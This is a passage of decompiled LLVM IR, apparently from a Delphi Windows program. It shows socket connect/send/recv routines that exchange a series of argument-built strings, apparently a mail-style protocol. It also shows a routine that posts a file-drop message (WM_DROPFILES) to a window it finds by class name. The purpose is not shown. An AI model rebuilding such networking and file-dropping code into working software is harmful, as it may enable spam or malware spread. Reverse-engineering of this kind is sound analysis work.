  store i32 %105, i32* %107, align 4, !insn.addr !893
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !894
  %109 = load i32, i32* %17, align 4, !insn.addr !895
  %110 = add i32 %esp.0.reload, -12, !insn.addr !895
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !895
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !896
  %113 = load i32, i32* %19, align 4, !insn.addr !897
  %114 = add i32 %esp.0.reload, -16, !insn.addr !897
  %115 = inttoptr i32 %114 to i32*, !insn.addr !897
  store i32 %113, i32* %115, align 4, !insn.addr !897
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !898
  %117 = load i32, i32* %21, align 4, !insn.addr !899
  %118 = add i32 %esp.0.reload, -20, !insn.addr !899
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !899
  %120 = call i32 @"@LStrCatN"(), !insn.addr !900
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !901
  %122 = load i32, i32* %23, align 4, !insn.addr !902
  %123 = add i32 %122, -1, !insn.addr !902
  %124 = icmp eq i32 %123, 0, !insn.addr !902
  store i32 %123, i32* %23, align 4, !insn.addr !902
  %125 = icmp eq i1 %124, false, !insn.addr !903
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !903
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !903
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !903

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !904
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !905
  store i32 4216319, i32* %111, align 4, !insn.addr !906
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !907
  ret i32 %127, !insn.addr !908
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !909
  ret i32 %0, !insn.addr !909
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !910
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !911
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !912
  %0 = call i32 @function_4036c8(), !insn.addr !913
  %1 = inttoptr i32 %0 to i8*, !insn.addr !914
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !915
  %3 = call i32 @"@FillChar"(), !insn.addr !916
  %4 = icmp eq %hostent* %2, null, !insn.addr !917
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !918

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !915
  %6 = add i32 %5, 12, !insn.addr !919
  %7 = inttoptr i32 %6 to i32*, !insn.addr !919
  %8 = load i32, i32* %7, align 4, !insn.addr !919
  %9 = inttoptr i32 %8 to i32*, !insn.addr !920
  %10 = load i32, i32* %9, align 4, !insn.addr !920
  %11 = inttoptr i32 %10 to i8*, !insn.addr !921
  %12 = load i8, i8* %11, align 1, !insn.addr !921
  %13 = sext i8 %12 to i32, !insn.addr !922
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !923
  br label %dec_label_pc_405653, !insn.addr !923

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !924
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !925
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !926
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !927
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !927
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !927
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !928
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !929
  %5 = trunc i32 %4 to i16, !insn.addr !929
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !930
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !931
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !931
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !932
  %9 = icmp eq i32 %8, -1, !insn.addr !933
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !934
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !934

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !935
  %11 = trunc i32 %10 to i16, !insn.addr !936
  %12 = call i16 @htons(i16 %11), !insn.addr !936
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !937
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !937
  %14 = sext i16 %12 to i32, !insn.addr !938
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !938
  %16 = icmp eq i32 %15, 0, !insn.addr !939
  %17 = icmp eq i1 %16, false, !insn.addr !940
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !940
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !940

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !941
  store i32 %8, i32* %18, align 4, !insn.addr !941
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !942
  br label %dec_label_pc_4056f2, !insn.addr !942

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !943
  %20 = load i32, i32* %19, align 4, !insn.addr !943
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !944
  %21 = add i32 %esp.0.reload, 8, !insn.addr !945
  %22 = inttoptr i32 %21 to i32*, !insn.addr !945
  store i32 4216591, i32* %22, align 4, !insn.addr !945
  %23 = call i32 @"@LStrClr"(), !insn.addr !946
  ret i32 %23, !insn.addr !947
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !948
  ret i32 %0, !insn.addr !948
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !949
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !950
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !951
  %2 = call i32 @WSACleanup(), !insn.addr !952
  ret i32 %2, !insn.addr !953
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !954
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !955
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !955
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !955
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !956
  %4 = call i32 @function_4036c8(), !insn.addr !957
  %5 = call i32 @StrCopy(), !insn.addr !958
  %6 = call i32 @function_406fcc(i32 4), !insn.addr !959
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !960
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !961
  %9 = call i32 @"@LStrClr"(), !insn.addr !962
  ret i32 %9, !insn.addr !963
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !964
  ret i32 %0, !insn.addr !964
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !965
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !966
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !967
  %2 = call i32 @StrPas(), !insn.addr !968
  ret i32 %2, !insn.addr !969
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !970
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !970
  %esp.0.reg2mem = alloca i32, !insn.addr !970
  %ecx.0.reg2mem = alloca i32, !insn.addr !970
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !971
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !972
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !972
  br label %dec_label_pc_4057d9, !insn.addr !972

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !973
  %2 = inttoptr i32 %1 to i32*, !insn.addr !973
  store i32 0, i32* %2, align 4, !insn.addr !973
  %3 = add i32 %esp.0.reload, -8, !insn.addr !974
  %4 = inttoptr i32 %3 to i32*, !insn.addr !974
  store i32 0, i32* %4, align 4, !insn.addr !974
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !975
  %6 = icmp eq i32 %5, 0, !insn.addr !975
  %7 = icmp eq i1 %6, false, !insn.addr !976
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !976
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !976
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !976

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !977
  %9 = inttoptr i32 %8 to i32*, !insn.addr !977
  store i32 0, i32* %9, align 4, !insn.addr !977
  %10 = call i32 @function_4036b8(), !insn.addr !978
  %11 = call i32 @function_4036b8(), !insn.addr !979
  %12 = call i32 @function_4036b8(), !insn.addr !980
  %13 = call i32 @function_4036b8(), !insn.addr !981
  %14 = call i32 @function_4036b8(), !insn.addr !982
  %15 = call i32 @function_4036b8(), !insn.addr !983
  %16 = call i32 @function_4036b8(), !insn.addr !984
  %17 = add i32 %esp.0.reload, -20, !insn.addr !985
  %18 = inttoptr i32 %17 to i32*, !insn.addr !985
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !985
  store i32 %19, i32* %18, align 4, !insn.addr !985
  %20 = add i32 %esp.0.reload, -24, !insn.addr !986
  %21 = inttoptr i32 %20 to i32*, !insn.addr !986
  store i32 4217413, i32* %21, align 4, !insn.addr !986
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !987
  %23 = add i32 %esp.0.reload, -28, !insn.addr !987
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !987
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !988
  %25 = call i32 @function_405664(), !insn.addr !989
  %26 = icmp eq i32 %25, 0, !insn.addr !990
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !991
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !991
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !991

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !992
  %28 = inttoptr i32 %27 to i32*, !insn.addr !992
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !992
  %29 = add i32 %esp.0.reload, -36, !insn.addr !993
  %30 = inttoptr i32 %29 to i32*, !insn.addr !993
  %31 = add i32 %esp.0.reload, -40, !insn.addr !994
  %32 = inttoptr i32 %31 to i32*, !insn.addr !994
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !994
  %33 = call i32 @"@LStrCatN"(), !insn.addr !995
  %34 = call i32 @function_405724(), !insn.addr !996
  %35 = call i32 @function_4057a4(), !insn.addr !997
  %36 = call i32 @function_405724(), !insn.addr !998
  %37 = call i32 @function_4057a4(), !insn.addr !999
  %38 = call i32 @"@LStrCat"(), !insn.addr !1000
  %39 = call i32 @function_405724(), !insn.addr !1001
  %40 = call i32 @function_4057a4(), !insn.addr !1002
  %41 = call i32 @"@LStrCat"(), !insn.addr !1003
  %42 = call i32 @function_405724(), !insn.addr !1004
  %43 = call i32 @function_4057a4(), !insn.addr !1005
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1006
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1006
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !1006
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1007
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1007
  store i32 %arg1, i32* %47, align 4, !insn.addr !1007
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1008
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1008
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !1008
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1009
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1009
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !1009
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1010
  %53 = call i32 @function_405724(), !insn.addr !1011
  %54 = call i32 @function_4057a4(), !insn.addr !1012
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1013
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1013
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !1013
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1014
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1014
  store i32 %arg2, i32* %58, align 4, !insn.addr !1014
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1015
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1015
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !1015
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1016
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1016
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !1016
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1017
  %64 = call i32 @function_405724(), !insn.addr !1018
  %65 = call i32 @function_4057a4(), !insn.addr !1019
  %66 = call i32 @function_405724(), !insn.addr !1020
  %67 = call i32 @function_4057a4(), !insn.addr !1021
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1022
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1022
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !1022
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1023
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1023
  store i32 %arg1, i32* %71, align 4, !insn.addr !1023
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1024
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1024
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !1024
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1025
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1025
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !1025
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1026
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1026
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !1026
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1027
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1027
  store i32 %arg2, i32* %79, align 4, !insn.addr !1027
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1028
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1028
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !1028
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1029
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1029
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !1029
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1030
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1030
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !1030
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1031
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1031
  store i32 %arg3, i32* %87, align 4, !insn.addr !1031
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1032
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1032
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !1032
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1033
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1033
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !1033
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1034
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1034
  store i32 %arg4, i32* %93, align 4, !insn.addr !1034
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1035
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1035
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !1035
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1036
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1036
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !1036
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1037
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !1037
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1038
  %101 = call i32 @function_405724(), !insn.addr !1039
  %102 = call i32 @function_4057a4(), !insn.addr !1040
  %103 = call i32 @function_405724(), !insn.addr !1041
  %104 = call i32 @function_4057a4(), !insn.addr !1042
  %105 = call i32 @function_405718(), !insn.addr !1043
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1044
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1044
  br label %dec_label_pc_405a10, !insn.addr !1044

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1045
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1045
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1046
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1047
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1048
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1048
  store i32 4217420, i32* %110, align 4, !insn.addr !1048
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1049
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1050
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1051
  ret i32 %113, !insn.addr !1052
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1053
  ret i32 %0, !insn.addr !1053
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1054
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1055
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1056
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1056
  store i32 %3, i32* %4, align 4, !insn.addr !1056
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1057
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1057
  %9 = add i8 %6, %8, !insn.addr !1057
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1057
  store i8 %9, i8* %10, align 1, !insn.addr !1057
  %11 = add i32 %2, 85, !insn.addr !1058
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1058
  %13 = load i8, i8* %12, align 1, !insn.addr !1058
  %14 = trunc i32 %1 to i8, !insn.addr !1058
  %15 = add i8 %13, %14, !insn.addr !1058
  store i8 %15, i8* %12, align 1, !insn.addr !1058
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1059
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1059
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1059
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1060
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1061
  %19 = add i32 %18, 1, !insn.addr !1061
  %20 = icmp eq i32 %19, 0, !insn.addr !1061
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1061
  %21 = icmp eq i1 %20, false, !insn.addr !1062
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1062

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1063
  %23 = call i32 @"@LStrClr"(), !insn.addr !1064
  br label %dec_label_pc_405b51, !insn.addr !1064

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1065
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1066
  ret i32 0, !insn.addr !1067
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1068
  ret i32 %0, !insn.addr !1068
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1069
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1070
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1071
  %2 = add i32 %1, -1, !insn.addr !1071
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1071
  ret i32 %0, !insn.addr !1072
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1073
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1074
  %2 = icmp eq i32 %0, 0, !insn.addr !1075
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1076
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1076

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1077
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1078
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1078
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1078
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1079
  %7 = icmp eq i1 %6, false, !insn.addr !1080
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1081
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1081

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1082
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1082
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1083
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1083
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1084
  %13 = icmp eq i1 %12, false, !insn.addr !1085
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1086
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1086

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1087
  %15 = add i32 %14, 22, !insn.addr !1088
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1089
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1089
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1090
  %18 = icmp eq i32* %17, null, !insn.addr !1091
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1092
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1092

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1093
  %20 = icmp eq i32* %19, null, !insn.addr !1094
  %21 = icmp eq i1 %20, false, !insn.addr !1095
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1095

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1096
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1096
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1096
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1097
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1098
  br label %dec_label_pc_405c7a, !insn.addr !1098

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1090
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1093
  store i32 20, i32* %19, align 4, !insn.addr !1099
  %27 = add i32 %26, 4, !insn.addr !1100
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1100
  store i32 0, i32* %28, align 4, !insn.addr !1100
  %29 = add i32 %26, 8, !insn.addr !1101
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1101
  store i32 0, i32* %30, align 4, !insn.addr !1101
  %31 = add i32 %26, 12, !insn.addr !1102
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1102
  store i32 0, i32* %32, align 4, !insn.addr !1102
  %33 = add i32 %26, 16, !insn.addr !1103
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1103
  store i32 0, i32* %34, align 4, !insn.addr !1103
  %35 = call i32 @function_4036c8(), !insn.addr !1104
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1105
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1105
  %37 = add i32 %26, 20, !insn.addr !1106
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1107
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1108
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1109
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1110
